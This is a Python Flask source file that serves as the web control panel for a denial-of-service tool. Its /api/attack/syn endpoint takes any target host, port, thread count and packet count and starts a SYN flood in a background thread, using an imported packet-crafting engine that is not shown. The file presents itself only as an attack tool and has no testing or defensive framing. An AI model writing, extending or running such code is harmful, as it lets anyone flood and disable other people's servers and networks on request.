from flask import Flask, request, jsonify
import threading
from engine.packet_crafter import AdvancedPacketCrafter
from utils.logger import logger

app = Flask(__name__)
crafter = AdvancedPacketCrafter()

@app.route('/api/attack/syn', methods=['POST'])
def launch_syn():
    data = request.json
    target = data.get('target', '127.0.0.1')
    port = data.get('port', 80)
    threads = data.get('threads', 10)
    count = data.get('count', 500)
    # Run in thread to not block
    def run():
        crafter.syn_flood(target, port, threads=threads, count=count)
    threading.Thread(target=run, daemon=True).start()
    return jsonify({"status": "started", "target": target, "port": port})

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({"status": "running", "attacks": "check logs"})

def start_api(host='127.0.0.1', port=5000):
    logger.info(f"Starting REST API on {host}:{port}")
    app.run(host=host, port=port, debug=False, use_reloader=False)